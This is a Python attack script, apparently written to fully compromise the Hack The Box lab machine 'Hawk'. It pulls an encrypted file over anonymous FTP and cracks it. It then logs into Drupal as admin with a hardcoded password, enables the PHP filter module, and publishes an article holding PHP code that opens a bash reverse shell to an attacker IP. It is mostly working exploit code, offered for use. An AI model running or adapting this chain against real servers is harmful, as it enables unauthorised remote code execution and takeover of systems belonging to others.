import sys,time,signal,ftplib,argparse,base64,os,requests,re,threading

def def_handler(sig,frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

def openssl_file_obtaining(ip):

    ftp=ftplib.FTP(ip)
    ftp.login("anonymous","")
    ftp.cwd("messages")
    with open("drupal.txt.enc","wb") as fp:
        ftp.retrbinary("RETR .drupal.txt.enc",fp.write)
    ftp.quit()

def file_decryption():

    text_encoded=""

    with open("drupal.txt.enc","r") as file:
        content=file.readlines()
    content_striped=list(map(lambda l:l.rstrip('\n'),content))
    for line in content_striped:
        text_encoded+=line
    text_encrypted=base64.b64decode(text_encoded)
    with open("drupal.enc","wb") as file:
        file.write(text_encrypted)
    os.system("./crack.sh;echo -n \"\n\" ;cat mensaje.txt")

def drupal_login(ip):
    
    session=requests.Session()
    response=session.post(f"http://{ip}")
    token=str(re.search(r'hidden" name="form_build_id" value=(".*?")',response.text)[1]).strip("\"")

    data={"name":"admin","pass":"PencilKeyboardScanner123","form_build_id":f"{token}","form_id":"user_login_block","op":"Log in"}
    cookies={"has_js":"1"}
    response=session.post(f"http://{ip}",data=data,cookies=cookies)

    return session

def drupal_rce(ip,session):

    proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

    response=session.post(f"http://{ip}/admin/modules?render=overlay")
    token_form_build=str(re.search(r'hidden" name="form_build_id" value=(".*?")',response.text)[1]).strip("\"")
    token=str(re.search(r'hidden" name="form_token" value=(".*?")',response.text)[1]).strip("\"")

    cookies={"has_js":"1","Drupal.toolbar.collapsed":"0"}
    data={"modules[Core][color][enable]":"1","modules[Core][comment][enable]":"1","modules[Core][contextual][enable]":"1","modules[Core][dashboard][enable]":"1","modules[Core][dblog][enable]":"1","modules[Core][field_ui][enable]":"1","modules[Core][help][enable]":"1","modules[Core][list][enable]":"1","modules[Core][menu][enable]":"1","modules[Core][number][enable]":"1","modules[Core][overlay][enable]":"1","modules[Core][path][enable]":"1","modules[Core][php][enable]":"1","modules[Core][rdf][enable]":"1","modules[Core][search][enable]":"1","modules[Core][shortcut][enable]":"1","modules[Core][toolbar][enable]":"1","form_build_id":f"{token_form_build}","form_token":f"{token}","form_id":"system_modules","op":"Save configuration"}
    session.post(f"http://{ip}/admin/modules/list/confirm?render=overlay",data=data,cookies=cookies,proxies=proxies,verify=False)

    response=session.post(f"http://{ip}/node/add/article?render=overlay",cookies=cookies,proxies=proxies,verify=False)
    token_form_build=str(re.search(r'hidden" name="form_build_id" value=(".*?")',response.text)[1]).strip("\"")
    token=str(re.search(r'hidden" name="form_token" value=(".*?")',response.text)[1]).strip("\"")
    headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0','Origin': 'http://10.10.10.102','Referer': 'http://10.10.10.102/node/add/article?render=overlay','Upgrade-Insecure-Requests': '1'}
    data={"title":(None,"pwned"),"field_tags[und]":(None,""),"body[und][0][summary]":(None,""),"body[und][0][value]":(None,"<?php system(\"bash -c 'bash -i >& /dev/tcp/10.10.16.5/9999 0>&1'\"); ?>"),"body[und][0][format]":(None,"php_code"),"files[field_image_und_0]":("","","application/octet-stream"),"field_image[und][0][fid]":(None,"0"),"field_image[und][0][display]":(None,"1"),"changed":(None,""),"form_build_id":(None,f"{token_form_build}"),"form_token":(None,f"{token}"),"form_id":(None,"article_node_form"),"menu[link_title]":(None,""),"menu[description]":(None,""),"menu[parent]":(None,"main-menu:0"),"menu[weight]":(None,"0"),"log":(None,""),"comment":(None,"2"),"path[alias]":(None,""),"name":(None,"admin"),"date":(None,""),"status":(None,"1"),"promote":(None,"1"),"additional_settings__active_tab":(None,"edit-menu"),"op":(None,"Save")}
    session.post(f"http://{ip}/node/add/article?render=overlay&render=overlay",headers=headers,files=data,cookies=cookies,proxies=proxies,verify=False)


signal.signal(signal.SIGINT,def_handler)

if __name__=="__main__":

    parser=argparse.ArgumentParser(usage="autopwn.py [arguments]", description="script designed to autopwn Hawk HTB machine.")

    parser.add_argument("ip", help="vulnerable machine IP")

    args=parser.parse_args()

    openssl_file_obtaining(args.ip)

    file_decryption()

    session=drupal_login(args.ip)


    try:
        threading.Thread(target=drupal_rce, args=(args.ip,session,)).start()
    except Exception as e:
        print(f"\n[!] Se ha producido un error: {e}")
    
    shell=listen(9999,timeout=20).wait_for_connection()

    shell.interactive()
